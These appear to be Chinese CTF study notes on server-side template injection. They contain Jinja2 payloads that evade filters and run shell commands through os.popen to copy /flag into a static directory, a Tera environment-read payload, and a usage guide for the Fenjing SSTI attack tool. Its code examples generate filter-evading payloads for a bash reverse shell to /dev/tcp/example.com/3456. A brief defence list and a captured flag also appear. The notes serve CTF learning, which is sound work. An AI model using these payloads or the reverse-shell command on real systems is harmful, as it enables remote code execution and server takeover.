{{nho|attr('__eq__')|attr('__g''lobals__')|attr('get')('__b''uiltins__')|attr('get')('__i''mport__')('os')|attr('popen')('mkdir /app/static')|attr('read')()}}
```

创建好了，然后写入flag

```
{{nho|attr('__eq__')|attr('__g''lobals__')|attr('get')('__b''uiltins__')|attr('get')('__i''mport__')('os')|attr('popen')('cat /flag >/app/static/1')|attr('read')()}}
```

访问/static/1得到flag

```
NSSCTF{f2c677ef-8998-48ea-8259-d6784ad35f00}
```





# 防御手段

1.将app.py和test.html分开写

避免掉render_template_string(template)的滥用

2.最小化攻击面

- 开启浏览器 HTML 自动转义: `autoescape=False` =>`autoescape=True`

> 这个措施会将 `<>`, `{}` 等字符转义, 同时能防御一些 XSS 攻击;

- 禁用模板语法, 例如: `{% import %}`

3.源码添加waf

# tonado

https://blog.csdn.net/miuzzx/article/details/123329244

# tera

```
# 1.攻防赛热身

{%print(7*7)%}
返回Failed to parse '__tera_one_off'
Failed to parse '__tera_one_off'
tera引擎
text={{ get_env(name="flag") }} 
```



### 1.fenjing使用

#### 1.启动webui



webui不支持自定义Headers和Cookie等特性，如果需要更灵活的使用方式请直接使用命令行或者作为库调用 执行`python -m fenjing webui`

并访问[http://127.0.0.1:11451](http://127.0.0.1:11451/)即可 

指定host和port：`python -m fenjing webui --host '127.0.0.1' --port 1145`

#### 2.作为命令行脚本使用



扫描网站：`python -m fenjing scan --url 'http://xxx.xxx/'`

攻击对应的表单：

- `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name`
- 也可以指定多个input：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name,email`
- 指定攻击成功后执行的命令
  - 不指定则进入交互模式
  - `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --exec-cmd 'ls /'`

攻击对应的路径：

- `python -m fenjing crack-path --url 'http://xxx.xxx/hello/'`
- 只需要提供路径的前缀即可

从文本文件中读取HTTP请求：

- `python -m fenjing crack-request -f req.txt --host '127.0.0.1' --port 5000`
- 需要提供HTTP请求文件的路径、目标的IP和端口

通用设置

- 指定请求间隔：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --interval 0.1`
- 指定请求时使用的UA：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --user-agent 'Aaa/1.1'`
- 指定Header：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --header 'Aaa: Bbb' --header 'Ccc: Ddd'`
- 指定Cookie：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --cookie 'name1=value1; name2=value2'`
- 指定代理：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --proxy 'http://127.0.0.1:7890'`
- 指定额外的GET参数：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --extra-params 'a=1&b=2'`
- 指定额外的POST参数：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --extra-data 'a=1&b=2'`
- 指定分析模式
  - `--detect-mode`：检测模式，可为accurate或fast
  - 示例：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --detect-mode fast`
  - 在开始尝试触发WAF, 获取WAF页面对应hash时：
    - accurate模式会一个接一个地发送尽可能多的payload
    - fast模式会将多个payload组合在一起发送，
  - 在生成payload时：
    - accurate模式会先从最简单的方法试起
    - fast模式会先尝试使用复杂但通常更能绕过WAF的方法
- 指定WAF替换危险关键字时的行为：
  - 使用`--replaced-keyword-strategy`选项
  - `avoid`: 避免使用会被WAF替换的关键字
  - `doubletapping`: 进行双写（如`class`变成`clclassass`）
  - `ignore`: 忽略，认为WAF不会对这些关键字做任何事
  - `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --replaced-keyword-strategy doubletapping`
- 指定模板渲染环境
  - 使用`--environment`选项
  - `flask`: （默认）模板在`render_template_string`等flask提供的函数中渲染，此时会使用`g`, `config`等flask提供的变量生成payload
  - `jinja`: 模板使用jinja内置的`Template`编译并渲染，相关代码类似`Template(s).render()`，此时避免使用任何普通jinja环境之外提供的变量生成payload

#### 3.Tamper Cmd的使用



如果指定了`--tamper-cmd`参数，焚靖在每次提交payload时会使用指定的命令打开一个子进程，向这个子进程的标准输入传入payload, 并将子进程的输出作为编码后的结果进行提交。

例如：Linux中有一个命令行程序`base64`，它会从输入中读取内容，进行base64编码并输出

我们就可以使用`--tamper-cmd 'base64'`指定使用这个命令编码payload

同样道理，`--tamper-cmd 'base64|rev'`就是先进行base64编码再将内容反转

也可以使用python来自定义编码方式，例子如下：

先新建一个`encoder.py`，写入以下内容：

```
s = input()
print(s[::-1], end = "") # 将payload反转
```



然后指定`--tamper-cmd 'python encoder.py'`就可以了

#### 4.作为库使用

1.根据WAF函数生成shell指令对应的payload

```
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    # config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    # print(f"{config_payload=}")
```

2.在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload

比如说如果提交的payload被WAF后，WAF页面含有"BAD"这三个字母，那么可以这么写：

```
import functools
import time
import requests
from fenjing import exec_cmd_payload


URL = "http://10.137.0.28:5000"


@functools.lru_cache(1000)
def waf(payload: str):  # 如果字符串s可以通过waf则返回True, 否则返回False
    time.sleep(0.02) # 防止请求发送过多
    resp = requests.get(URL, timeout=10, params={"name": payload})
    return "BAD" not in resp.text


if __name__ == "__main__":
    shell_payload, will_print = exec_cmd_payload(
        waf, 'bash -c "bash -i >& /dev/tcp/example.com/3456 0>&1"'
    )
    if not will_print:
        print("这个payload不会产生回显！")

    print(f"{shell_payload=}")
```

3.让生成器学会使用新的变量

[参考](https://github.com/Marven11/Fenjing/issues/4)

比如说你想让生成器学会使用新的变量`aaa`，它的值是100，需要在payload的前面加上`{%set aaa=0x64%}`，那你只需要这么写

```
from fenjing.full_payload_gen import FullPayloadGen
from fenjing.const import OS_POPEN_READ
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 这个函数因题目而定
    blacklist = [
        "00", "1", "3", "5", "7", "9"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    full_payload_gen = FullPayloadGen(waf)
    full_payload_gen.do_prepare()
    full_payload_gen.add_context_variable("{%set aaa=0x64%}", {"aaa": 100})
    shell_payload, will_print = full_payload_gen.generate(OS_POPEN_READ, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    if not will_print:
        print("这个payload不会产生回显")
    print(f"{shell_payload=}")
```

# 遇到的

tornado模板的handler.settings利用（from[护网杯 2018]easy_tornado）

CVE-2021-26119，smarty下非法访问$smarty.template_object



{% endraw %}

